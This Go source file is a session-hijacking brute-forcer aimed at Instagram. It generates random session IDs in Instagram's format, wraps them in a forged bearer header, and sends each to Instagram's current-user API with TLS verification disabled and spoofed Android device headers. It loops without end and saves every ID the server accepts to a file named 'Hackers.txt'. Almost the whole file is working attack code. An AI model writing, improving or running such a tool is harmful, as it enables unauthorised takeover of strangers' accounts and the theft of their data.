package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"
)

func proxyScraper() []string {
	return []string{""}
}

func numberGenerator(lenx int) string {
	rand.Seed(time.Now().UnixNano())
	var userid string
	for i := 0; i != lenx; i++ {
		userid += fmt.Sprintf("%d", rand.Intn(9))
	}
	return userid
}

func charactersGenerator(characters string, lenx int) string {
	rand.Seed(time.Now().UnixNano())
	// how to find the length of a string in go
	length := len(characters)
	var part string
	for i := 0; i != lenx; i++ {
		part += string(characters[rand.Intn(length)])
	}
	return part
}

func generateUserID() string {
	rand.Seed(time.Now().UnixNano())
	// generate a random number with 9 or 10 or 11 digits
	var rnd int = rand.Intn(3) + 9
	var userid string = numberGenerator(rnd)
	return userid
}

func generatePart1() string {
	// generate a random string with 14 characters using the following characters "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"
	var part1 string
	var characters string = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"
	part1 = charactersGenerator(characters, 14)
	return part1
}

func generatePart2() string {
	// generate a random number between 0-30
	rand.Seed(time.Now().UnixNano())
	var part2 string = fmt.Sprintf("%d", rand.Intn(31))
	return part2
}

func generateFullSessionID() (string, string) {
	userid := generateUserID()
	var sessionID string = userid + "%3A" + generatePart1() + "%3A" + generatePart2()
	return sessionID, userid
}

func authHeaderGenrator() string {
	sessionID, userid := generateFullSessionID()
	auth := `{"ds_user_id":"` + userid + `","sessionid":"` + sessionID + `"}`
	// -- TODO: encode the auth string using base64 --
	newAuth := base64.StdEncoding.EncodeToString([]byte(auth))
	return `Bearer IGT:2:` + newAuth

}

func checkInsagramSessionID(sessionID string) bool {
	// TODO: add proxy support
	// TODO: add andriod id gen support
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, _ := http.NewRequest("GET", "https://i.instagram.com/api/v1/accounts/current_user", nil)
	req.Header.Set("Host", "i.instagram.com")
	req.Header.Set("X-Ig-App-Locale", "en_US")
	req.Header.Set("X-Ig-Device-Locale", "en_US")
	req.Header.Set("X-Ig-Mapped-Locale", "en_US")
	req.Header.Set("X-Ig-Bandwidth-Speed-Kbps", "11.000")
	req.Header.Set("X-Ig-Bandwidth-Totalbytes-B", "4539501")
	req.Header.Set("X-Ig-Bandwidth-Totaltime-Ms", "6909")
	req.Header.Set("X-Ig-App-Startup-Country", "US")
	req.Header.Set("X-Bloks-Version-Id", "0ee04a4a6556c5bb584487d649442209a3ae880ae5c6380b16235b870fcc4052")
	req.Header.Set("X-Bloks-Is-Layout-Rtl", "false")
	req.Header.Set("X-Ig-Device-Id", "b8336313-4663-409a-a450-a4ecf257679a")
	req.Header.Set("X-Ig-Family-Device-Id", "3b638845-8876-4c67-a26c-ed73e8222a97")
	req.Header.Set("X-Ig-Android-Id", "android-d06265366f5da5ae")
	req.Header.Set("X-Ig-Timezone-Offset", "14400")
	req.Header.Set("X-Fb-Connection-Type", "WIFI")
	req.Header.Set("X-Ig-Connection-Type", "WIFI")
	req.Header.Set("X-Ig-Capabilities", "3brTv10=")
	req.Header.Set("X-Ig-App-Id", "567067343352427")
	req.Header.Set("User-Agent", "Instagram 265.0.0.19.301 Android (25/7.1.2; 240dpi; 720x1280; samsung; SM-G988N; z3q; exynos8895; en_US; 436384447)")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("Authorization", "Bearer IGT:2:"+sessionID)
	// req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("X-Fb-Http-Engine", "Liger")
	req.Header.Set("X-Fb-Client-Ip", "True")
	req.Header.Set("X-Fb-Server-Cluster", "True")
	resp, _ := client.Do(req)
	if resp.StatusCode != 200 {
		return false
	} else {
		return true
	}
}

func main() {
	for true {
		sessionID := authHeaderGenrator()
		if checkInsagramSessionID(sessionID) {
			fmt.Println(sessionID)
			file, err := os.OpenFile("Hackers.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				log.Println(err)
			}
			if _, err := file.WriteString(sessionID + "\n"); err != nil {
				log.Println(err)
			}
			if err := file.Close(); err != nil {
				log.Println(err)
			}
		}
	}
}
